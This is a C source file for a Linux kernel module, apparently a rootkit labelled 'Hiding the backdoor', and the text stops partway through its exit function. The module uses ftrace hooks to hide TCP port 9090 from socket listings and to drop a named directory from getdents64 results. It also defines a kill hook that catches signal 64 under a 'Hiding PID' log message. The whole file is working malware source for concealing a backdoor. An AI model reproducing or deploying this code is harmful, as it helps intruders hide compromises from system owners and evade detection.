#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>

#define PORT 9090              /* Define a porta a ser ocultada */
#define HIDE_DIR "Directory_name" /* Nome do diretório a ser ocultado */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PedroRodriguesDEV_security");
MODULE_DESCRIPTION("Hiding the backdoor");
MODULE_VERSION("1.0");

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;

    if (sk && sk->sk_num == PORT) {
        printk(KERN_DEBUG "Port hidden\n");
        return 0; 
    }

    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;

    if (sk && sk->sk_num == PORT) {
        printk(KERN_DEBUG "Port hidden\n");
        return 0; 
    }

    return orig_tcp6_seq_show(seq, v);
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *user_dir = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kernel_dir_buffer = NULL;
    long result;
    long error;
    unsigned long offset = 0;

    result = orig_getdents64(regs);
    if (result <= 0) return result;

    kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
    if (!kernel_dir_buffer) return -ENOMEM;

    if (copy_from_user(kernel_dir_buffer, user_dir, result)) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    while (offset < result) {
        struct linux_dirent64 *current_entry = (struct linux_dirent64 *)((char *)kernel_dir_buffer + offset);
        unsigned long reclen = current_entry->d_reclen;

        if (strncmp(current_entry->d_name, HIDE_DIR, strlen(HIDE_DIR)) == 0) {
            result -= reclen;
            memmove(current_entry, (char *)current_entry + reclen, result - offset);
            continue;
        }

        offset += reclen;
    }

    if (copy_to_user(user_dir, kernel_dir_buffer, result)) {
        kfree(kernel_dir_buffer);
        return -EFAULT;
    }

    kfree(kernel_dir_buffer);
    return result;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static asmlinkage int hook_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int sig = regs->si;

    if (sig == 64) { 
        printk(KERN_DEBUG "Hiding PID: %d\n", pid);
        return 0; 
    }

    return orig_kill(regs);
}

static struct ftrace_hook kill_hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init hideport_init(void) {
    int err;

    
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if (err) return err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) return err;

    return 0;
}

static void __exit hideport_exit(void) {
    fh_remove_hooks(new
